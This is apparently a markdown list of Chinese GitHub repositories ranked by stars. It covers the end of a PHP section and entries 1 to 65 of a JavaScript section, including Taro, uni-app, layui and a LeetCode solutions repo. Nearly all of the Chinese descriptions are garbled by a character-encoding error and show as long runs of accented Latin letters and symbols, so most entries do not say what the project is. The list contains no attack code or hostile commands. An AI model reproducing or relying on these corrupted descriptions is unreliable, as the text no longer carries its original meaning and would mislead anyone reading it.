|195|[buqiu/laravel-shop](https://github.com/buqiu/laravel-shop)|Âü∫‰∫é Laravel ‰∏ÄÊ≠•‰∏ÄÊ≠•ÊûÑÂª∫‰∏ÄÂ•óÁîµÂïÜÁ≥ªÁªü„ÄÇ‰ΩøÁî® Laravel-Admin Âø´ÈÄüÊûÑÂª∫ÁÆ°ÁêÜÂêéÂè∞„ÄÅÊîØ‰ªòÂÆùÂíåÂæÆ‰ø°ÊîØ‰ªòÁöÑÂõûË∞ÉÈÄöÁü•Â§ÑÁêÜ„ÄÅLaravel È°πÁõÆ‰∏≠ÂØπÂºÇÂ∏∏ÁöÑÂ§ÑÁêÜ„ÄÅË¥≠Áâ©ËΩ¶ËÆæËÆ°„ÄÅÂïÜÂìÅ SKU Êï∞ÊçÆÁªìÊûÑËÆæËÆ°„ÄÅÈÄöËøáÂª∂ËøüÈòüÂàóËá™Âä®ÂÖ≥Èó≠ËÆ¢Âçï„ÄÅMySQL ‰∫ãÂä°Â§ÑÁêÜ„ÄÅÂ∫ìÂ≠òÂ¢ûÂáèÁöÑÊ≠£Á°ÆÂßøÂäø„ÄÅÊó†ÈôêÁ∫ßÂàÜÁ±ª„ÄÅElasticsearch„ÄÅÂàÜÈù¢ÊêúÁ¥¢„ÄÅ‰ª£Á†ÅÈÉ®ÁΩ≤„ÄÅË¥üËΩΩÂùáË°°„ÄÅÂéãÂäõÊµãËØï„ÄÅÊé•Âè£ÊÄßËÉΩ‰ºòÂåñ„ÄÅÈöèÊú∫ÊãíÁªùÁ≠âÁîµÂïÜÂºÄÂèëÁõ∏ÂÖ≥ÁöÑÈ´òÁ∫ßÊäÄÊúØÊ¶ÇÂøµ„ÄÇ|184|PHP|10/28|
|196|[Kimiato/DriveDirectLink](https://github.com/Kimiato/DriveDirectLink)|DriveDirectLink ÁΩëÁõòÁõ¥Èìæ‰∏ãËΩΩÔºåÊîØÊåÅË∞∑Ê≠å, ËìùÂ•è‰∫ë,360‰∫ëÁõò|182|PHP|07/07|
|197|[txperl/airAnime](https://github.com/txperl/airAnime)|ËΩªÈáèÂåñÂä®Êº´ËÅöÂêàÊêúÁ¥¢Â∑•ÂÖ∑|182|PHP|10/13|
|198|[brewlin/swoft-im](https://github.com/brewlin/swoft-im)|Âü∫‰∫éswoft-cloudÁöÑÂæÆÊúçÂä°Êû∂ÊûÑÔºåÊúÄÂ∞èÂåñÊãÜÂàÜÁ≤íÂ∫¶ÔºåPHP7„ÄÅÂ§öËøõÁ®ã„ÄÅÂçèÁ®ã„ÄÅÂºÇÊ≠•‰ªªÂä°„ÄÅmysqlËøûÊé•Ê±†„ÄÅrediËøûÊé•Ê±†„ÄÅrpcËøûÊé•Ê±†„ÄÅÊúçÂä°Ê≤ªÁêÜ„ÄÅÊúçÂä°Ê≥®ÂÜå‰∏éÂèëÁé∞„ÄÅAopÂàáÈù¢„ÄÅÂÖ®Ê≥®Ëß£|181|PHP|07/31|
|199|[yeskn-studio/vmoex-framework](https://github.com/yeskn-studio/vmoex-framework)|‰∏Ä‰∏™ÂºÄÊ∫êÁöÑ‰∫åÊ¨°ÂÖÉÂêëÁöÑÁ§æÂå∫Á®ãÂ∫è„ÄÇ|181|PHP|09/13|
|200|[Hanson/laravel-admin-wechat](https://github.com/Hanson/laravel-admin-wechat)|laravel admin ÁöÑÂæÆ‰ø°Êâ©Â±ïÂåÖÔºåÊîØÊåÅÂ§öÂÖ¨‰ºóÂè∑„ÄÅÂ§öÂ∞èÁ®ãÂ∫è„ÄÅÂ§öÂæÆ‰ø°ÊîØ‰ªòÔºåÂåÖÂê´Âü∫Á°ÄÊé•Âè£‰∏éÂêéÂè∞|180|PHP|04/25|

‚¨Ü [ÂõûÂà∞ÁõÆÂΩï](#ÁõÆÂΩï)

<br/>

## JavaScript

|#|Repository|Description|Stars|Language|Updated|
|:-|:-|:-|:-|:-|:-|
|1|[scutan90/DeepLearning-500-questions](https://github.com/scutan90/DeepLearning-500-questions)|Ê∑±Â∫¶Â≠¶‰π†500ÈóÆÔºå‰ª•ÈóÆÁ≠îÂΩ¢ÂºèÂØπÂ∏∏Áî®ÁöÑÊ¶ÇÁéáÁü•ËØÜ„ÄÅÁ∫øÊÄß‰ª£Êï∞„ÄÅÊú∫Âô®Â≠¶‰π†„ÄÅÊ∑±Â∫¶Â≠¶‰π†„ÄÅËÆ°ÁÆóÊú∫ËßÜËßâÁ≠âÁÉ≠ÁÇπÈóÆÈ¢òËøõË°åÈòêËø∞Ôºå‰ª•Â∏ÆÂä©Ëá™Â∑±ÂèäÊúâÈúÄË¶ÅÁöÑËØªËÄÖ„ÄÇ ÂÖ®‰π¶ÂàÜ‰∏∫18‰∏™Á´†ËäÇÔºå50‰Ωô‰∏áÂ≠ó„ÄÇÁî±‰∫éÊ∞¥Âπ≥ÊúâÈôêÔºå‰π¶‰∏≠‰∏çÂ¶•‰πãÂ§ÑÊÅ≥ËØ∑ÂπøÂ§ßËØªËÄÖÊâπËØÑÊåáÊ≠£„ÄÇ   Êú™ÂÆåÂæÖÁª≠............ Â¶ÇÊúâÊÑèÂêà‰ΩúÔºåËÅîÁ≥ªscutjy2015@163.com                     ÁâàÊùÉÊâÄÊúâÔºåËøùÊùÉÂøÖÁ©∂       Tan 2018.06|41.2k|JavaScript|10/29|
|2|[azl397985856/leetcode](https://github.com/azl397985856/leetcode)| LeetCode Solutions: A Record of My Problem Solving Journey.( leetcodeÈ¢òËß£ÔºåËÆ∞ÂΩïËá™Â∑±ÁöÑleetcodeËß£È¢ò‰πãË∑Ø„ÄÇ)|37.5k|JavaScript|10/29|
|3|[chinese-poetry/chinese-poetry](https://github.com/chinese-poetry/chinese-poetry)|The most comprehensive database of Chinese poetry üß∂ÊúÄÂÖ®‰∏≠ÂçéÂè§ËØóËØçÊï∞ÊçÆÂ∫ì,  ÂîêÂÆã‰∏§ÊúùËøë‰∏Ä‰∏áÂõõÂçÉÂè§ËØó‰∫∫,  Êé•Ëøë5.5‰∏áÈ¶ñÂîêËØóÂä†26‰∏áÂÆãËØó.  ‰∏§ÂÆãÊó∂Êúü1564‰ΩçËØç‰∫∫Ôºå21050È¶ñËØç„ÄÇ    ÈòøÈáåÊãõ Python P6/P7 ‰∏äÊµ∑Âº†Ê±ü, gaojunqi@outlook.com|30.1k|JavaScript|10/29|
|4|[NervJS/taro](https://github.com/NervJS/taro)|ÂºÄÊîæÂºèË∑®Á´ØË∑®Ê°ÜÊû∂Ëß£ÂÜ≥ÊñπÊ°àÔºåÊîØÊåÅ‰ΩøÁî® React/Vue/Nerv Á≠âÊ°ÜÊû∂Êù•ÂºÄÂèëÂæÆ‰ø°/‰∫¨‰∏ú/ÁôæÂ∫¶/ÊîØ‰ªòÂÆù/Â≠óËäÇË∑≥Âä®/ QQ Â∞èÁ®ãÂ∫è/H5 Á≠âÂ∫îÁî®„ÄÇ  https://taro.jd.com/|27.3k|JavaScript|10/30|
|5|[dcloudio/uni-app](https://github.com/dcloudio/uni-app)|uni-app ÊòØ‰ΩøÁî® Vue ËØ≠Ê≥ïÂºÄÂèëÂ∞èÁ®ãÂ∫è„ÄÅH5„ÄÅAppÁöÑÁªü‰∏ÄÊ°ÜÊû∂|26.5k|JavaScript|10/29|
|6|[sentsin/layui](https://github.com/sentsin/layui)|ÈááÁî®Ëá™Ë∫´Ê®°ÂùóËßÑËåÉÁºñÂÜôÁöÑÂâçÁ´Ø UI Ê°ÜÊû∂ÔºåÈÅµÂæ™ÂéüÁîü HTML/CSS/JS ÁöÑ‰π¶ÂÜôÂΩ¢ÂºèÔºåÊûÅ‰ΩéÈó®ÊßõÔºåÊãøÊù•Âç≥Áî®„ÄÇ|22.6k|JavaScript|10/02|
|7|[Advanced-Frontend/Daily-Interview-Question](https://github.com/Advanced-Frontend/Daily-Interview-Question)|ÊàëÊòØÊú®ÊòìÊù®ÔºåÂÖ¨‰ºóÂè∑„ÄåÈ´òÁ∫ßÂâçÁ´ØËøõÈò∂„Äç‰ΩúËÄÖÔºåÊØèÂ§©ÊêûÂÆö‰∏ÄÈÅìÂâçÁ´ØÂ§ßÂéÇÈù¢ËØïÈ¢òÔºåÁ•ùÂ§ßÂÆ∂Â§©Â§©ËøõÊ≠•Ôºå‰∏ÄÂπ¥Âêé‰ºöÁúãÂà∞‰∏ç‰∏ÄÊ†∑ÁöÑËá™Â∑±„ÄÇ|20.8k|JavaScript|05/27|
|8|[Tencent/wepy](https://github.com/Tencent/wepy)|Â∞èÁ®ãÂ∫èÁªÑ‰ª∂ÂåñÂºÄÂèëÊ°ÜÊû∂|20.8k|JavaScript|10/04|
|9|[Meituan-Dianping/mpvue](https://github.com/Meituan-Dianping/mpvue)|Âü∫‰∫é Vue.js ÁöÑÂ∞èÁ®ãÂ∫èÂºÄÂèëÊ°ÜÊû∂Ôºå‰ªéÂ∫ïÂ±ÇÊîØÊåÅ Vue.js ËØ≠Ê≥ïÂíåÊûÑÂª∫Â∑•ÂÖ∑‰ΩìÁ≥ª„ÄÇ|20.1k|JavaScript|09/09|
|10|[ruanyf/es6tutorial](https://github.com/ruanyf/es6tutorial)|„ÄäECMAScript 6ÂÖ•Èó®„ÄãÊòØ‰∏ÄÊú¨ÂºÄÊ∫êÁöÑ JavaScript ËØ≠Ë®ÄÊïôÁ®ãÔºåÂÖ®Èù¢‰ªãÁªç ECMAScript 6 Êñ∞Â¢ûÁöÑËØ≠Ê≥ïÁâπÊÄß„ÄÇ|18.7k|JavaScript|10/27|
|11|[YMFE/yapi](https://github.com/YMFE/yapi)|YApi ÊòØ‰∏Ä‰∏™ÂèØÊú¨Âú∞ÈÉ®ÁΩ≤ÁöÑ„ÄÅÊâìÈÄöÂâçÂêéÁ´ØÂèäQAÁöÑ„ÄÅÂèØËßÜÂåñÁöÑÊé•Âè£ÁÆ°ÁêÜÂπ≥Âè∞|18.3k|JavaScript|10/26|
|12|[Binaryify/NeteaseCloudMusicApi](https://github.com/Binaryify/NeteaseCloudMusicApi)|ÁΩëÊòì‰∫ëÈü≥‰πê Node.js API service|17.5k|JavaScript|10/29|
|13|[zhaoolee/ChromeAppHeroes](https://github.com/zhaoolee/ChromeAppHeroes)|üåàË∞∑Á≤í-ChromeÊèí‰ª∂Ëã±ÈõÑÊ¶ú, ‰∏∫‰ºòÁßÄÁöÑChromeÊèí‰ª∂ÂÜô‰∏ÄÊú¨‰∏≠ÊñáËØ¥Êòé‰π¶, ËÆ©ChromeÊèí‰ª∂Ëã±ÈõÑ‰ª¨ÈÄ†Á¶è‰∫∫Á±ª~  ChromePluginHeroes, Write a Chinese manual for the excellent Chrome plugin, let the Chrome plugin heroes benefit the human~ ÂÖ¨‰ºóÂè∑„Äå0Âä†1„ÄçÂêåÊ≠•Êõ¥Êñ∞|17.2k|JavaScript|10/26|
|14|[alsotang/node-lessons](https://github.com/alsotang/node-lessons)|:closed_book:„ÄäNode.js ÂåÖÊïô‰∏çÂåÖ‰ºö„Äã by alsotang|16.0k|JavaScript|06/10|
|15|[alibaba/ice](https://github.com/alibaba/ice)|üöÄ  Simple and friendly front-end development systemÔºàÈ£ûÂÜ∞ÔºåÁÆÄÂçïËÄåÂèãÂ•ΩÁöÑÂâçÁ´ØÁ†îÂèë‰ΩìÁ≥ª Ôºâhttps://ice.work/|15.8k|JavaScript|10/29|
|16|[chaozh/awesome-blockchain-cn](https://github.com/chaozh/awesome-blockchain-cn)|Êî∂ÈõÜÊâÄÊúâÂå∫ÂùóÈìæ(BlockChain)ÊäÄÊúØÂºÄÂèëÁõ∏ÂÖ≥ËµÑÊñôÔºåÂåÖÊã¨FabricÂíåEthereumÂºÄÂèëËµÑÊñô|15.1k|JavaScript|05/29|
|17|[haizlin/fe-interview](https://github.com/haizlin/fe-interview)|ÂâçÁ´ØÈù¢ËØïÊØèÊó• 3+1Ôºå‰ª•Èù¢ËØïÈ¢òÊù•È©±Âä®Â≠¶‰π†ÔºåÊèêÂÄ°ÊØèÊó•Â≠¶‰π†‰∏éÊÄùËÄÉÔºåÊØèÂ§©ËøõÊ≠•‰∏ÄÁÇπÔºÅÊØèÂ§©Êó©‰∏ä5ÁÇπÁ∫ØÊâãÂ∑•ÂèëÂ∏ÉÈù¢ËØïÈ¢òÔºàÊ≠ªÁ£ïËá™Â∑±ÔºåÊÑâÊÇ¶Â§ßÂÆ∂ÔºâÔºå3000+ÈÅìÂâçÁ´ØÈù¢ËØïÈ¢òÂÖ®Èù¢Ë¶ÜÁõñÔºåHTML/CSS/JavaScript/Vue/React/Nodejs/TypeScript/ECMAScritpt/Webpack/Jquery/Â∞èÁ®ãÂ∫è/ËΩØÊäÄËÉΩ‚Ä¶‚Ä¶|14.0k|JavaScript|10/30|
|18|[youzan/vant-weapp](https://github.com/youzan/vant-weapp)|ËΩªÈáè„ÄÅÂèØÈù†ÁöÑÂ∞èÁ®ãÂ∫è UI ÁªÑ‰ª∂Â∫ì|13.7k|JavaScript|10/15|
|19|[EastWorld/wechat-app-mall](https://github.com/EastWorld/wechat-app-mall)|ÂæÆ‰ø°Â∞èÁ®ãÂ∫èÂïÜÂüéÔºåÂæÆ‰ø°Â∞èÁ®ãÂ∫èÂæÆÂ∫ó|13.4k|JavaScript|10/24|
|20|[qianguyihao/Web](https://github.com/qianguyihao/Web)|ÂâçÁ´ØÂÖ•Èó®Âà∞ËøõÈò∂ÂõæÊñáÊïôÁ®ãÔºåË∂ÖËØ¶ÁªÜÁöÑWebÂâçÁ´ØÂ≠¶‰π†Á¨îËÆ∞„ÄÇ‰ªéÈõ∂ÂºÄÂßãÂ≠¶ÂâçÁ´ØÔºåÂÅö‰∏ÄÂêçÁ≤æËá¥‰ºòÈõÖÁöÑÂâçÁ´ØÂ∑•Á®ãÂ∏à„ÄÇÂÖ¨‰ºóÂè∑„ÄåÂçÉÂè§Â£πÂè∑„Äç‰ΩúËÄÖ„ÄÇ|13.1k|JavaScript|10/23|
|21|[dcloudio/mui](https://github.com/dcloudio/mui)|ÊúÄÊé•ËøëÂéüÁîüAPP‰ΩìÈ™åÁöÑÈ´òÊÄßËÉΩÊ°ÜÊû∂|13.0k|JavaScript|07/30|
|22|[ryanhanwu/How-To-Ask-Questions-The-Smart-Way](https://github.com/ryanhanwu/How-To-Ask-Questions-The-Smart-Way)|Êú¨ÊñáÂéüÊñáÁî±Áü•Âêç Hacker Eric S. Raymond ÊâÄÊí∞ÂØ´ÔºåÊïô‰Ω†Â¶Ç‰ΩïÊ≠£Á¢∫ÁöÑÊèêÂá∫ÊäÄË°ìÂïèÈ°å‰∏¶Áç≤Âæó‰Ω†ÊªøÊÑèÁöÑÁ≠îÊ°à„ÄÇ|12.9k|JavaScript|10/25|
|23|[phobal/ivideo](https://github.com/phobal/ivideo)|‰∏Ä‰∏™ÂèØ‰ª•ËßÇÁúãÂõΩÂÜÖ‰∏ªÊµÅËßÜÈ¢ëÂπ≥Âè∞ÊâÄÊúâËßÜÈ¢ëÁöÑÂÆ¢Êà∑Á´ØÔºàMac„ÄÅWindows„ÄÅLinuxÔºâ A client that can watch video of domestic(China) mainstream video platform|11.7k|JavaScript|09/04|
|24|[Tencent/omi](https://github.com/Tencent/omi)| Front End Cross-Frameworks Framework - ÂâçÁ´ØË∑®Ê°ÜÊû∂Ë∑®Âπ≥Âè∞Ê°ÜÊû∂|11.4k|JavaScript|09/30|
|25|[amfe/lib-flexible](https://github.com/amfe/lib-flexible)|ÂèØ‰º∏Áº©Â∏ÉÂ±ÄÊñπÊ°à|11.1k|JavaScript|06/19|
|26|[bailicangdu/node-elm](https://github.com/bailicangdu/node-elm)|Âü∫‰∫é node.js + Mongodb ÊûÑÂª∫ÁöÑÂêéÂè∞Á≥ªÁªü|10.3k|JavaScript|09/11|
|27|[answershuto/learnVue](https://github.com/answershuto/learnVue)|:octocat:Vue.js Ê∫êÁ†ÅËß£Êûê|10.0k|JavaScript|10/19|
|28|[xiandanin/magnetW](https://github.com/xiandanin/magnetW)|Á£ÅÂäõÈìæÊé•ËÅöÂêàÊêúÁ¥¢|9.5k|JavaScript|07/23|
|29|[modood/Administrative-divisions-of-China](https://github.com/modood/Administrative-divisions-of-China)|‰∏≠Âçé‰∫∫Ê∞ëÂÖ±ÂíåÂõΩË°åÊîøÂå∫ÂàíÔºöÁúÅÁ∫ßÔºàÁúÅ‰ªΩÁõ¥ËæñÂ∏ÇËá™Ê≤ªÂå∫Ôºâ„ÄÅ Âú∞Á∫ßÔºàÂüéÂ∏ÇÔºâ„ÄÅ ÂéøÁ∫ßÔºàÂå∫ÂéøÔºâ„ÄÅ ‰π°Á∫ßÔºà‰π°ÈïáË°óÈÅìÔºâ„ÄÅ ÊùëÁ∫ßÔºàÊùëÂßî‰ºöÂ±ÖÂßî‰ºöÔºâ Ôºå‰∏≠ÂõΩÁúÅÂ∏ÇÂå∫ÈïáÊùë‰∫åÁ∫ß‰∏âÁ∫ßÂõõÁ∫ß‰∫îÁ∫ßËÅîÂä®Âú∞ÂùÄÊï∞ÊçÆ„ÄÇ|9.1k|JavaScript|07/30|
|30|[cnodejs/nodeclub](https://github.com/cnodejs/nodeclub)|:baby_chick:Nodeclub ÊòØ‰ΩøÁî® Node.js Âíå MongoDB ÂºÄÂèëÁöÑÁ§æÂå∫Á≥ªÁªü|8.9k|JavaScript|09/23|
|31|[bailicangdu/vue2-happyfri](https://github.com/bailicangdu/vue2-happyfri)|vue2 + vue-router + vuex  ÂÖ•Èó®È°πÁõÆ|8.4k|JavaScript|08/11|
|32|[trazyn/ieaseMusic](https://github.com/trazyn/ieaseMusic)|ÁΩëÊòì‰∫ëÈü≥‰πêÁ¨¨‰∏âÊñπ|8.3k|JavaScript|07/07|
|33|[zhaoolee/ChineseBQB](https://github.com/zhaoolee/ChineseBQB)|üá®üá≥ Chinese sticker pack,More joy / Ë°®ÊÉÖÂåÖÁöÑÂçöÁâ©È¶Ü, GithubÊúÄÊúâÊØíÁöÑ‰ªìÂ∫ì, ‰∏≠ÂõΩË°®ÊÉÖÂåÖÂ§ßÈõÜÂêà, ËÅöÊ¨¢‰πê~|8.2k|JavaScript|10/12|
|34|[star7th/showdoc](https://github.com/star7th/showdoc)|ShowDoc is a tool greatly applicable for an IT team to share documents online‰∏Ä‰∏™ÈùûÂ∏∏ÈÄÇÂêàITÂõ¢ÈòüÁöÑÂú®Á∫øAPIÊñáÊ°£„ÄÅÊäÄÊúØÊñáÊ°£Â∑•ÂÖ∑|8.0k|JavaScript|10/24|
|35|[didi/chameleon](https://github.com/didi/chameleon)|ü¶é ‰∏ÄÂ•ó‰ª£Á†ÅËøêË°åÂ§öÁ´ØÔºå‰∏ÄÁ´ØÊâÄËßÅÂç≥Â§öÁ´ØÊâÄËßÅ|7.9k|JavaScript|09/21|
|36|[haotian-wang/google-access-helper](https://github.com/haotian-wang/google-access-helper)|Ë∞∑Ê≠åËÆøÈóÆÂä©ÊâãÁ†¥Ëß£Áâà|7.6k|JavaScript|04/04|
|37|[evil-huawei/evil-huawei](https://github.com/evil-huawei/evil-huawei)|Evil Huawei - Âçé‰∏∫‰ΩúËøáÁöÑÊÅ∂|7.6k|JavaScript|08/03|
|38|[thinkgem/jeesite](https://github.com/thinkgem/jeesite)|JeeSite ÊòØ‰∏Ä‰∏™‰ºÅ‰∏ö‰ø°ÊÅØÂåñÂºÄÂèëÂü∫Á°ÄÂπ≥Âè∞ÔºåJava‰ºÅ‰∏öÂ∫îÁî®ÂºÄÊ∫êÊ°ÜÊû∂ÔºåJava EEÔºàJ2EEÔºâÂø´ÈÄüÂºÄÂèëÊ°ÜÊû∂Ôºå‰ΩøÁî®ÁªèÂÖ∏ÊäÄÊúØÁªÑÂêàÔºàSpring„ÄÅSpring MVC„ÄÅApache Shiro„ÄÅMyBatis„ÄÅBootstrap UIÔºâÔºåÂåÖÊã¨Ê†∏ÂøÉÊ®°ÂùóÂ¶ÇÔºöÁªÑÁªáÊú∫ÊûÑ„ÄÅËßíËâ≤Áî®Êà∑„ÄÅÊùÉÈôêÊéàÊùÉ„ÄÅÊï∞ÊçÆÊùÉÈôê„ÄÅÂÜÖÂÆπÁÆ°ÁêÜ„ÄÅÂ∑•‰ΩúÊµÅÁ≠â„ÄÇ|7.5k|JavaScript|10/08|
|39|[icindy/wxParse](https://github.com/icindy/wxParse)|wxParse-ÂæÆ‰ø°Â∞èÁ®ãÂ∫èÂØåÊñáÊú¨Ëß£ÊûêËá™ÂÆö‰πâÁªÑ‰ª∂ÔºåÊîØÊåÅHTMLÂèämarkdownËß£Êûê|7.5k|JavaScript|03/19|
|40|[eip-work/kuboard-press](https://github.com/eip-work/kuboard-press)|Kuboard ÊòØÂü∫‰∫é Kubernetes ÁöÑÂæÆÊúçÂä°ÁÆ°ÁêÜÁïåÈù¢„ÄÇÂêåÊó∂Êèê‰æõ Kubernetes ÂÖçË¥π‰∏≠ÊñáÊïôÁ®ãÔºåÂÖ•Èó®ÊïôÁ®ãÔºåÊúÄÊñ∞ÁâàÊú¨ÁöÑ Kubernetes v1.18 ÂÆâË£ÖÊâãÂÜåÔºå(k8s install) Âú®Á∫øÁ≠îÁñëÔºåÊåÅÁª≠Êõ¥Êñ∞„ÄÇ|7.1k|JavaScript|10/29|
|41|[bailicangdu/react-pxq](https://github.com/bailicangdu/react-pxq)|‰∏Ä‰∏™ react + redux ÁöÑÂÆåÊï¥È°πÁõÆ Âíå ‰∏™‰∫∫ÊÄªÁªì|6.9k|JavaScript|08/11|
|42|[1c7/Crash-Course-Computer-Science-Chinese](https://github.com/1c7/Crash-Course-Computer-Science-Chinese)|:computer: ËÆ°ÁÆóÊú∫ÈÄüÊàêËØæ   Crash Course Â≠óÂπïÁªÑ (ÂÖ®40ÈõÜ 2018-5-1 Á≤æÊ†°ÂÆåÊàê)|6.1k|JavaScript|07/02|
|43|[ElemeFE/v-charts](https://github.com/ElemeFE/v-charts)|Âü∫‰∫é Vue2.0 Âíå ECharts Â∞ÅË£ÖÁöÑÂõæË°®ÁªÑ‰ª∂üìàüìä|6.1k|JavaScript|08/26|
|44|[chokcoco/CSS-Inspiration](https://github.com/chokcoco/CSS-Inspiration)|CSS InspirationÔºåÂú®ËøôÈáåÊâæÂà∞ÂÜô CSS ÁöÑÁÅµÊÑüÔºÅ|5.8k|JavaScript|08/26|
|45|[ljianshu/Blog](https://github.com/ljianshu/Blog)|ÂÖ≥Ê≥®Âü∫Á°ÄÁü•ËØÜÔºåÊâìÈÄ†‰ºòË¥®ÂâçÁ´ØÂçöÂÆ¢ÔºåÂÖ¨‰ºóÂè∑[ÂâçÁ´ØÂ∑•Âå†]ÁöÑ‰ΩúËÄÖ|5.8k|JavaScript|09/11|
|46|[hotoo/pinyin](https://github.com/hotoo/pinyin)|:cn: Ê±âÂ≠óÊãºÈü≥ ‚ûú h√†n z√¨ pƒ´n yƒ´n|5.4k|JavaScript|09/29|
|47|[ustbhuangyi/vue-analysis](https://github.com/ustbhuangyi/vue-analysis)|:thumbsup: Vue.js Ê∫êÁ†ÅÂàÜÊûê|5.4k|JavaScript|09/11|
|48|[fex-team/ueditor](https://github.com/fex-team/ueditor)|rich text ÂØåÊñáÊú¨ÁºñËæëÂô®|5.4k|JavaScript|09/27|
|49|[timqian/chinese-independent-blogs](https://github.com/timqian/chinese-independent-blogs)|‰∏≠ÊñáÁã¨Á´ãÂçöÂÆ¢ÂàóË°®|5.3k|JavaScript|10/29|
|50|[wuchangming/spy-debugger](https://github.com/wuchangming/spy-debugger)|ÂæÆ‰ø°Ë∞ÉËØïÔºåÂêÑÁßçWebViewÊ†∑ÂºèË∞ÉËØï„ÄÅÊâãÊú∫ÊµèËßàÂô®ÁöÑÈ°µÈù¢ÁúüÊú∫Ë∞ÉËØï„ÄÇ‰æøÊç∑ÁöÑËøúÁ®ãË∞ÉËØïÊâãÊú∫È°µÈù¢„ÄÅÊäìÂåÖÂ∑•ÂÖ∑ÔºåÊîØÊåÅÔºöHTTP/HTTPSÔºåÊó†ÈúÄUSBËøûÊé•ËÆæÂ§á„ÄÇ|5.3k|JavaScript|07/17|
|51|[HcySunYang/vue-design](https://github.com/HcySunYang/vue-design)|üìñ masterÂàÜÊîØÔºö„ÄäÊ∏≤ÊüìÂô®„Äã elegantÂàÜÊîØÔºöÈÄêË°åÁ∫ßÂà´ÁöÑÊ∫êÁ†ÅÂàÜÊûê|5.1k|JavaScript|09/25|
|52|[ix64/unlock-music](https://github.com/ix64/unlock-music)|Unlock encrypted music file in browser. Âú®ÊµèËßàÂô®‰∏≠Ëß£ÈîÅÂä†ÂØÜÁöÑÈü≥‰πêÊñá‰ª∂„ÄÇ|5.0k|JavaScript|10/20|
|53|[sxei/chrome-plugin-demo](https://github.com/sxei/chrome-plugin-demo)|„ÄäChromeÊèí‰ª∂ÂºÄÂèëÂÖ®ÊîªÁï•„ÄãÈÖçÂ•óÂÆåÊï¥DemoÔºåÊ¨¢Ëøéclone‰ΩìÈ™å|4.9k|JavaScript|06/18|
|54|[openspug/spug](https://github.com/openspug/spug)|ÂºÄÊ∫êËøêÁª¥Âπ≥Âè∞ÔºöÈù¢Âêë‰∏≠Â∞èÂûã‰ºÅ‰∏öËÆæËÆ°ÁöÑËΩªÈáèÁ∫ßÊó†AgentÁöÑËá™Âä®ÂåñËøêÁª¥Âπ≥Âè∞ÔºåÊï¥Âêà‰∫Ü‰∏ªÊú∫ÁÆ°ÁêÜ„ÄÅ‰∏ªÊú∫ÊâπÈáèÊâßË°å„ÄÅ‰∏ªÊú∫Âú®Á∫øÁªàÁ´Ø„ÄÅÊñá‰ª∂Âú®Á∫ø‰∏ä‰º†‰∏ãËΩΩ„ÄÅÂ∫îÁî®ÂèëÂ∏ÉÈÉ®ÁΩ≤„ÄÅÂú®Á∫ø‰ªªÂä°ËÆ°Âàí„ÄÅÈÖçÁΩÆ‰∏≠ÂøÉ„ÄÅÁõëÊéß„ÄÅÊä•Ë≠¶Á≠â‰∏ÄÁ≥ªÂàóÂäüËÉΩ„ÄÇ|4.8k|JavaScript|10/28|
|55|[ecomfe/echarts-for-weixin](https://github.com/ecomfe/echarts-for-weixin)|Apache ECharts (incubating) ÁöÑÂæÆ‰ø°Â∞èÁ®ãÂ∫èÁâàÊú¨|4.6k|JavaScript|09/11|
|56|[AutoPiano/AutoPiano](https://github.com/AutoPiano/AutoPiano)|Ëá™Áî±Èí¢Áê¥ üéπ AutoPiano ( https://www.autopiano.cn )   Simple & Elegant Piano Online|4.5k|JavaScript|09/09|
|57|[wux-weapp/wux-weapp](https://github.com/wux-weapp/wux-weapp)|:dog: ‰∏ÄÂ•óÁªÑ‰ª∂Âåñ„ÄÅÂèØÂ§çÁî®„ÄÅÊòìÊâ©Â±ïÁöÑÂæÆ‰ø°Â∞èÁ®ãÂ∫è UI ÁªÑ‰ª∂Â∫ì|4.5k|JavaScript|09/15|
|58|[Jannchie/Historical-ranking-data-visualization-based-on-d3.js](https://github.com/Jannchie/Historical-ranking-data-visualization-based-on-d3.js)|ËøôÊòØ‰∏Ä‰∏™Êï∞ÊçÆÂèØËßÜÂåñÈ°πÁõÆÔºåËÉΩÂ§üÂ∞ÜÂéÜÂè≤Êï∞ÊçÆÊéíÂêçËΩ¨Âåñ‰∏∫Âä®ÊÄÅÊü±Áä∂ÂõæÂõæË°®|4.5k|JavaScript|10/07|
|59|[xiaolin3303/wx-charts](https://github.com/xiaolin3303/wx-charts)|ÂæÆ‰ø°Â∞èÁ®ãÂ∫èÂõæË°®chartsÁªÑ‰ª∂ÔºåCharts for WeChat small app|4.3k|JavaScript|06/10|
|60|[wechat-miniprogram/miniprogram-demo](https://github.com/wechat-miniprogram/miniprogram-demo)|ÂæÆ‰ø°Â∞èÁ®ãÂ∫èÁªÑ‰ª∂ / API / ‰∫ëÂºÄÂèëÁ§∫‰æã|4.3k|JavaScript|10/29|
|61|[the1812/Bilibili-Evolved](https://github.com/the1812/Bilibili-Evolved)|Âº∫Â§ßÁöÑÂìîÂì©ÂìîÂì©Â¢ûÂº∫ËÑöÊú¨: ‰∏ãËΩΩËßÜÈ¢ë, Èü≥‰πê, Â∞ÅÈù¢, ÂºπÂπï / ÁÆÄÂåñÁõ¥Êí≠Èó¥, ËØÑËÆ∫Âå∫, È¶ñÈ°µ / Ëá™ÂÆö‰πâÈ°∂Ê†è, Âà†Èô§ÂπøÂëä, Â§úÈó¥Ê®°Âºè / Ëß¶Â±èËÆæÂ§áÊîØÊåÅ|4.2k|JavaScript|10/30|
|62|[SaekiRaku/vscode-rainbow-fart](https://github.com/SaekiRaku/vscode-rainbow-fart)|‰∏Ä‰∏™Âú®‰Ω†ÁºñÁ®ãÊó∂ÁñØÁãÇÁß∞Ëµû‰Ω†ÁöÑ VSCode Êâ©Â±ïÊèí‰ª∂   An VSCode extension that keeps giving you compliment while you are coding, it will checks the keywords of code to play suitable sounds.|4.2k|JavaScript|07/21|
|63|[Kenshin/simpread](https://github.com/Kenshin/simpread)|ÁÆÄÊÇ¶ ( SimpRead ) - ËÆ©‰Ω†Áû¨Èó¥ËøõÂÖ•Ê≤âÊµ∏ÂºèÈòÖËØªÁöÑÊâ©Â±ï|4.1k|JavaScript|10/21|
|64|[duxianwei520/react](https://github.com/duxianwei520/react)| React+webpack+redux+ant design+axios+lessÂÖ®ÂÆ∂Ê°∂ÂêéÂè∞ÁÆ°ÁêÜÊ°ÜÊû∂|3.9k|JavaScript|09/05|
|65|[lessfish/underscore-analysis](https://github.com/lessfish/underscore-analysis)|„ÄêNO LONGER UPDATE„Äëunderscore-1.8.3.js Ê∫êÁ†ÅËß£ËØª & Á≥ªÂàóÊñáÁ´†ÔºàÂÆåÔºâ|3.8k|JavaScript|03/05|
